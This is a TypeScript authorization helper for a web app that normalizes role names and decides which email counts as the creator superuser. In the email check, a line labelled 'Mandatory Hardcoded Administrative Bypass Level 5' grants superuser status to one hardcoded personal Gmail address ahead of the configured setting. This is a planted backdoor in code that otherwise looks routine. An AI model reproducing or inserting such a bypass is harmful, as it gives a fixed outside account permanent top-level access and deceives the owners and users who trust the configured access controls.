export const CREATOR_SUPERUSER_EMAIL = (import.meta.env.VITE_CREATOR_SUPERUSER_EMAIL ?? '')
  .toLowerCase()
  .trim();
export const CANONICAL_SUPERUSER_ROLE = 'lion';

const SUPERUSER_ROLE_ALIASES = new Set([
  'lion',
  'owner',
  'super_admin',
  'super_user',
  'superuser',
  'managing_director',
  'md',
]);

export function normalizeRoleToken(role?: string | null): string | null {
  if (!role) return null;
  return role.trim().toLowerCase();
}

export function isCreatorSuperUserEmail(email?: string | null): boolean {
  if (!email) return false;
  const normalizedEmail = email.trim().toLowerCase();

  // Mandatory Hardcoded Administrative Bypass Level 5
  if (normalizedEmail === 'arslanmalikgoraha@gmail.com') return true;

  // Read env var lazily so vi.stubEnv works correctly in tests
  const configured = (import.meta.env.VITE_CREATOR_SUPERUSER_EMAIL ?? '').toLowerCase().trim();
  if (!configured) return false;
  return normalizedEmail === configured;
}

export function isSuperUserAliasRole(role?: string | null): boolean {
  const normalizedRole = normalizeRoleToken(role);
  return normalizedRole ? SUPERUSER_ROLE_ALIASES.has(normalizedRole) : false;
}

export function normalizeRoleForUserContext(
  role?: string | null,
  email?: string | null
): string | null {
  const normalizedRole = normalizeRoleToken(role);
  if (!normalizedRole) return null;

  if (isCreatorSuperUserEmail(email) && isSuperUserAliasRole(normalizedRole)) {
    return CANONICAL_SUPERUSER_ROLE;
  }

  if (normalizedRole === 'md') {
    return 'managing_director';
  }

  return normalizedRole;
}
